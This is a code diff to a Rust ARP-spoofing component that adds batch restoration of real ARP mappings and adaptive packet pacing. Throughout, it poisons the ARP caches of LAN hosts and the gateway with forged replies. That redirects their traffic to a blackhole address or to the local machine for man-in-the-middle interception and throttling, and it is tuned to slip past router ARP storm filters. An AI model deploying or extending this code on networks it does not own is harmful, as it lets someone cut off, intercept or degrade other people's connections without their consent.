@@ -162,6 +162,19 @@ impl ArpSpoofer {
         }
     }
 
+    pub fn remove_targets(&self, ips: &[Ipv4Addr]) {
+        let mut removed = Vec::new();
+        {
+            let mut targets = self.targets.write();
+            for ip in ips {
+                if let Some(host) = targets.remove(ip) {
+                    removed.push(host);
+                }
+            }
+        }
+        self.restore_all(&removed);
+    }
+
     pub fn stop(&self) {
         self.running.store(false, Ordering::SeqCst);
         let targets = self
@@ -170,38 +183,58 @@ impl ArpSpoofer {
             .drain()
             .map(|(_, h)| h)
             .collect::<Vec<_>>();
-        for host in targets {
-            self.restore(&host);
-        }
+        self.restore_all(&targets);
     }
 
     pub fn restore(&self, host: &Host) {
-        if let Some(ref sender) = *self.sender.read() {
-            for _ in 0..3 {
-                // Restore host: tell host that gateway is at genuine gateway_mac.
-                // Ethernet source MAC must be host's local_mac (the transmitting adapter).
-                let pkt_host = craft_arp_reply(
-                    host.mac,
-                    self.local_mac,
-                    self.gateway_ip,
-                    self.gateway_mac,
-                    host.ip,
-                    host.mac,
-                );
-                let _ = sender.send_frame(&pkt_host);
+        self.restore_all(&[host.clone()]);
+    }
 
-                // Restore gateway: tell gateway that host is at genuine host.mac.
-                // Ethernet source MAC must be host's local_mac (the transmitting adapter).
-                let pkt_gw = craft_arp_reply(
-                    self.gateway_mac,
-                    self.local_mac,
-                    host.ip,
-                    host.mac,
-                    self.gateway_ip,
-                    self.gateway_mac,
-                );
-                let _ = sender.send_frame(&pkt_gw);
-                thread::sleep(Duration::from_millis(50));
+    pub fn restore_all(&self, targets: &[Host]) {
+        if targets.is_empty() {
+            return;
+        }
+        if let Some(ref sender) = *self.sender.read() {
+            let num_hosts = targets.len();
+            let per_host_delay = if num_hosts <= 5 {
+                Duration::from_millis(10)
+            } else {
+                let micros = (300_000 / num_hosts).clamp(500, 5000) as u64;
+                Duration::from_micros(micros)
+            };
+
+            let passes = if num_hosts <= 10 { 3 } else { 2 };
+            for pass in 0..passes {
+                for host in targets {
+                    // Restore host: tell host that gateway is at genuine gateway_mac.
+                    // Ethernet source MAC must be host's local_mac (the transmitting adapter).
+                    let pkt_host = craft_arp_reply(
+                        host.mac,
+                        self.local_mac,
+                        self.gateway_ip,
+                        self.gateway_mac,
+                        host.ip,
+                        host.mac,
+                    );
+                    let _ = sender.send_frame(&pkt_host);
+
+                    // Restore gateway: tell gateway that host is at genuine host.mac.
+                    // Ethernet source MAC must be host's local_mac (the transmitting adapter).
+                    let pkt_gw = craft_arp_reply(
+                        self.gateway_mac,
+                        self.local_mac,
+                        host.ip,
+                        host.mac,
+                        self.gateway_ip,
+                        self.gateway_mac,
+                    );
+                    let _ = sender.send_frame(&pkt_gw);
+
+                    thread::sleep(per_host_delay);
+                }
+                if pass + 1 < passes {
+                    thread::sleep(Duration::from_millis(40));
+                }
             }
         }
     }
@@ -222,8 +255,35 @@ impl ArpSpoofer {
         thread::spawn(move || {
             while running.load(Ordering::Relaxed) {
                 let hosts: Vec<Host> = targets.read().values().cloned().collect();
+                if hosts.is_empty() {
+                    for _ in 0..2 {
+                        if !running.load(Ordering::Relaxed) {
+                            break;
+                        }
+                        thread::sleep(Duration::from_millis(100));
+                    }
+                    continue;
+                }
+
+                let current_mode = *mode.read();
+                let num_hosts = hosts.len();
+
+                // High-performance adaptive pacing:
+                // Smoothly spaces packet transmissions across ~1.0 second so router ARP storm
+                // filters, packet drop queues, and local NIC TX descriptors are never overwhelmed.
+                let per_host_delay = if num_hosts <= 5 {
+                    Duration::from_millis(40)
+                } else if num_hosts <= 20 {
+                    Duration::from_millis(20)
+                } else {
+                    let micros = (1_000_000 / num_hosts).clamp(1000, 20_000) as u64;
+                    Duration::from_micros(micros)
+                };
+
+                let sweep_start = std::time::Instant::now();
+
                 if let Some(ref s) = *sender.read() {
-                    for host in hosts {
+                    for host in &hosts {
                         if !running.load(Ordering::Relaxed) {
                             break;
                         }
@@ -235,7 +295,7 @@ impl ArpSpoofer {
                         // - For Limited: route to local_mac so WinDivert can shape packets.
                         let (spoof_gw_mac, spoof_host_mac) = match host.status {
                             HostStatus::Blocked(dir) => {
-                                let block_target_mac = match *mode.read() {
+                                let block_target_mac = match current_mode {
                                     SpooferMode::Blackhole => BLACKHOLE_MAC,
                                     SpooferMode::Mitm => local_mac,
                                 };
@@ -265,9 +325,10 @@ impl ArpSpoofer {
                             host.ip,
                             host.mac,
                         );
-                        // Dual-burst on Wi-Fi/Ethernet to prevent frame drop bypass
                         let _ = s.send_frame(&pkt_host_reply);
-                        let _ = s.send_frame(&pkt_host_reply);
+
+                        // Micro-delay between host packet and gateway packet to prevent back-to-back collision
+                        thread::sleep(Duration::from_micros(100));
 
                         // Poison gateway: Host IP is at spoof_host_mac.
                         // Ethernet frame source MAC MUST be local_mac.
@@ -280,15 +341,34 @@ impl ArpSpoofer {
                             gateway_mac,
                         );
                         let _ = s.send_frame(&pkt_gw_reply);
-                        let _ = s.send_frame(&pkt_gw_reply);
+
+                        // Dual-burst on smaller networks where medium is completely unconstrained
+                        if num_hosts <= 10 {
+                            let _ = s.send_frame(&pkt_host_reply);
+                            let _ = s.send_frame(&pkt_gw_reply);
+                        }
+
+                        // Pace between consecutive hosts
+                        thread::sleep(per_host_delay);
                     }
                 }
-                // High-frequency 5Hz loop (200ms) prevents router/client ARP refresh window
-                for _ in 0..2 {
-                    if !running.load(Ordering::Relaxed) {
-                        break;
+
+                // If sweep completed faster than target cycle (1.0s or 500ms for small target counts),
+                // sleep the remainder in responsive 50ms chunks.
+                let elapsed = sweep_start.elapsed();
+                let target_cycle = if num_hosts <= 5 {
+                    Duration::from_millis(500)
+                } else {
+                    Duration::from_millis(1000)
+                };
+
+                if elapsed < target_cycle {
+                    let mut remaining = target_cycle - elapsed;
+                    while remaining > Duration::ZERO && running.load(Ordering::Relaxed) {
+                        let chunk = remaining.min(Duration::from_millis(50));
+                        thread::sleep(chunk);
+                        remaining = remaining.saturating_sub(chunk);
                     }
-                    thread::sleep(Duration::from_millis(100));
                 }
             }
         });
